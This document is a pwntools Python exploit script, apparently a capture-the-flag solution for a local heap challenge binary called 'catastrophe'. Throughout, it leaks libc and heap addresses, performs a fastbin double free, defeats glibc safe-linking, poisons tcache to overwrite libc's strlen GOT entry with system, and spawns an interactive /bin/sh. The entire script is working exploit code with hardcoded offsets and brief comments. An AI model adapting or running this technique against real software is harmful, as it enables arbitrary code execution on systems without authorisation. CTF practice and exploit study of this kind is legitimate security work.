#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./catastrophe')
libc=ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

def add(idx,size,content):
    sla("> ","1")
    sla("> ",str(idx))
    sla("> ",str(size))
    sla(": ",content)
def free(idx):
    sla("> ","2")
    sla("> ",str(idx))
def view(idx):
    sl("3")
    sl(str(idx))

def decrypt(cipher):
    key = 0
    plain = 0

    for i in range(1, 6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain


for i in range(9):
    add(i,0x100,"aaaa")
# fill tcache and put some in unsorted bin
for i in range(8,-1,-1):
    free(i)

# gdb.attach(p)


# libc leak through viewing unsorted bin
view(0)
leak = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - 0x219ce0
info("libc: "+str(hex(libc.address)))

# setup
stdout=libc.address+0x21a780
system = libc.address+0x50d60
# binsh=next(libc.search(b"/bin/sh\0"))
environ = libc.address+0x221200
strlen_got = libc.address + 0x219098

# empty tcache and make unsortedbin chunks to fastbin size
for i in range(9):
    add(i,0x38,"079079")
# fill tcache
for i in range(7):
    free(i)

# double free in fastbin
free(7)
free(8)
free(7)

# heap leak
view(8)
leak = u64(p.recvuntil(b"\x55")[-6:].ljust(8, b"\x00"))

# decrypt safe linking
dec = decrypt(leak)
print(hex(dec))

heap = dec-0x450
info("actual heap: "+str(hex(heap)))

# gdb.attach(p)

# empty tcache (0x40) and split unsorted bin to fastbin
for i in range(7):
    add(i,0x38,"aaaa")
    
# gdb.attach(p)

info("actual heap: "+str(hex(heap)))
info("libc: "+str(hex(libc.address)))
info("system: "+str(hex(system)))
print(hex(strlen_got))


add(0,0x38,p64((strlen_got-0x8) ^ (heap >> 12)))
add(0,0x38,"079079")
add(1,0x38,b"/bin/sh\0")
add(0,0x38,p64(0)+p64(system))
view(1)

p.interactive()
